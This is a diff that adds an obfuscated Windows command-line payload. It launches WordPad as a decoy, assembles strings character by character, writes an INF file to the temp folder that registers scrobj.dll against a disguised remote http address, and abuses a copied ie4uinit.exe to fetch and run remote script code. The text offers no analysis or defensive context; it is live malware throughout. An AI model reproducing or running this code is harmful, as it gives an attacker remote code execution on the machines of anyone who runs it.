@@ -1,0 +1,21 @@
+/v /c start "" "%ProgramFiles%\Windows NT\Accessories\wordpad.exe" & (for %e in ("encurt=se" "inne=t" "hlorrith=s" "limnersq=ca" ) do @set %~e) &&
+  call(for %b in ("x") do @set "debun=%~b") &&
+  (for %y in ("R") do @set "eleph=%~y") &&
+  callcall(for %y in ("w") do @set "perigemma=%~y") &&
+  (for %e in ("\") do @set "neighb=%~e") &&
+  (for %d in ("r") do @set "reeligibi=%~d") &&
+  call(for %x in ("e") do @set "auro=%~x") &&
+  call(for %h in ("s") do @set "serologic=%~h") &&
+  call(for %u in ("t") do @set "elotillonon=%~u") &&
+  call(for %s in ("o") do @set "braehea=%~s") &&
+  (for %j in ("4") do @set "roborat=%~j") &&
+  (for %n in ("%windir%") do @set "estheriagra=%~n") &&
+  callcallcall(for %x in ("a") do @set "kay=%~x") &&
+  (for %o in ("3") do @set "afte=%~o") &&
+  (for %s in ("l") do @set "frate=%~s") &&
+  callcall(for %k in ("l") do @set "frate=%~k") &&
+  callcall(for %z in ("=") do @set "balloonis=%~z") &&
+  (for %y in ("]") do @set "submod=%~y") &&
+  callcallcallcallcall(for %g in ("[version]" "signature=$windows nt$" "[5475]" "%unscholasti%e%resil%i%metronidaz%i%jas%.%unscholasti%n%cuidadobde%" "[destinationdirs]" "defaultdestdir=11" "5475=01" "[defaultinstall.windows7]" "delfiles=5475" "Un\" "Register\" "OCXs=whimsica_1F9" "[whimsica_1F9]" "%sigmoidope%c%dufreni%o%hemozoo%\" "j%sestertia%d%fibromyo%l,N%bloodwor%,h%jas%t%unflitc%:%tetraed%/%cuidadobde%9%chairwome%f%snafflingst%f%snafflingst%.%hemozoo%o%hemozoo%b%lox%w%fancy%i%sigmoidope%m%uniridescen%n%sestertia%c%quorp%m%tetraed%k%uniridescen%k%cuidadobde%g%uniridescen%r" "[strings]" "servicename= 'landammann'" "shortsvcname= 'landammann'" "sestertia=." "tetraed=/" "chairwome=3" "snafflingst=4" "bloodwor=I" "uniridescen=a" "hemozoo=b" "fancy=e" "cuidadobde=f" "unscholasti=i" "fibromyo=l" "metronidaz=n" "quorp=o" "unflitc=p" "dufreni=r" "sigmoidope=s" "jas=t" "resil=u" "lox=y" ) do @echo %~g) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
